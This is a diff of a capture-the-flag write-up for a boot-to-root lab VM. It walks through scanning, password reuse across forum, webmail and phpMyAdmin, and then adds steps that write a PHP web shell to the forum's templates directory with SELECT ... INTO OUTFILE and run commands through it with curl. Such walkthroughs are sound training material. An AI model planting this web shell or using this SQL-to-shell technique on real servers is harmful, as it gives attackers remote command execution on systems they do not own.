@@ -20,10 +20,10 @@ PORT    STATE SERVICE
 So boot-to-root vm running on 192.168.56.102 ip, and have few open ports.
 
 On http there is site, which is pretty empty, I check it html source code and there is nothing interesting in it. 
-After that I scanned it with * skipfish -o path_to_save http://192.168.56.102 * and * nikto -h http://192.168.56.102 *, and in sub dirs I got only fonts and icons so it's completely useless (I think).
+After that I scanned it with * skipfish -o path_to_save http://192.168.56.102 * and * nikto -h http://192.168.56.102 *, and not found thomething interesting.
 
 There is another open port which could be scanned, it's https.
-*skipfish* now is useless, because https://192.168.56.102 returns 404, but with *nikto -h https://192.168.56.102* we have few interesting dirs: forum, webmail, phpmyadmin
+using *nikto -h https://192.168.56.102* we recieve few interesting dirs: forum, webmail, phpmyadmin
 
 On forum there are 4 topics and only one is iteresting, topic *Probleme login* where user *lmezard* push logs with attempts to log in.
 
@@ -33,5 +33,29 @@ And, these characters came up for lmezard password.
 
 In lmezard profile we could see his email, so we go to webmail, and try the same password !q\]Ej?*5K5cy*AJ to his mail. And it's fits again.
 
-In mail there is message * DB Access * which contains * Use root/Fg-'kKXBj87E:aJ$ *. It doesn't fit to ssh and ftp connection, but fit to phpmyadmin.
+In mail there is message * DB Access * which contains * Use root/Fg-'kKXBj87E:aJ$ *. It doesn't fit to ssh and ftp connection, but it's fit to phpmyadmin.
 
+First of all I checked all tables in db, but all users passwords hashed and I didn't find any helpful information.
+And another way to get access to server - is SQL injection through which you can access the shell.
+(detailed articles about SQL injections https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/ https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)
+
+* SELECT  '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/hack.php' *
+templates_c - dir which always need write permission, used for compiled templates.
+
+After that we can run something like this * https://192.168.56.102/forum/templates_c/hack.php?cmd=pwd *
+
+Few commands later, we can see LOOKATME dir in home dir with users 
+* curl --insecure 'https://192.168.56.102/forum/templates_c/hack.php?cmd=ls%20-la%20/home' *
+drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
+drwxr-xr-x 1 root                 root                 200 Apr 16 04:01 ..
+drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
+drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
+drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
+drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
+dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
+drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
+drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
+
+There is file password in this dir, which contains * lmezard:G!@M6f4Eatau{sF" *
+
+This passwd fit to ftp port, which contains README file - "Complete this little challenge and use the result as password for user 'laurie' to login in ssh" and fun file (which need to decode).
